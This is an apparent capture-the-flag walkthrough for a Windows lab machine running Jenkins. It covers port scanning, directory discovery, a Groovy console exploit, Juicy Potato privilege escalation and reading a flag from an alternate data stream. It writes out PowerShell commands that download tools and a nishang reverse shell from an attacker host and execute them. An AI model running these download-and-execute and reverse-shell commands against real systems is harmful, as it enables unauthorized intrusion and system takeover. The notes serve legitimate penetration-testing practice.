Find open ports using NMAP

Its is found there is a hidden port 50000, use -P- in nmap scans for hidden ports

Dir search using Gobuster or FFuF to the port 50000 yields /askjeeves directory

Open 10.10.10.63:50000/askjeeves

It directs to Jenkins page

On the right-bottom cornet of the page, we can see current version of jenkins as 2.87 

Use can groovy exploit code to get the user shell, which has less previlages



Winodows less previlages file transfer 


powershell -c  "Invoke-WebRequest -Uri http://10.10.16.90:8081/JuicyPotato.exe -outFile C:\Users\kohsuke\Desktop\JP.exe"


Output folder with file name should be specified mandatorily 

Once the JuicyPotato.exe is moved into the target

Now we need to download and move powershell script in ps1 format, which can be downloaded from 

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

rename it to shell.ps1 and transfer file to target system, if it doesn't work then rename to shell.bat

powershell -c  "Invoke-WebRequest -Uri http://10.10.16.90:8081/adminshell.bat -outFile C:\Users\kohsuke\Desktop\adminshell.bat"

powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.90:8000/shell1.ps1')"

Follow this blog for Previlage escalation using Executing the Juicy potato, it executres adminshell.bat (execture while file transfer and give admin shell)

Also it is so tricky to find the root.txt, 

In desktop it is hidden inside hm.txt to we need to use alternate commands to get the root flag

Find the HIDDEN root.txt exist -->Get-item -Path C:\Users\Administrator\Desktop\hm.txt -stream *
Read contents from root.txt --> Get-Content -Path C:\Users\Administrator\Desktop\hm.txt -Stream root.txt
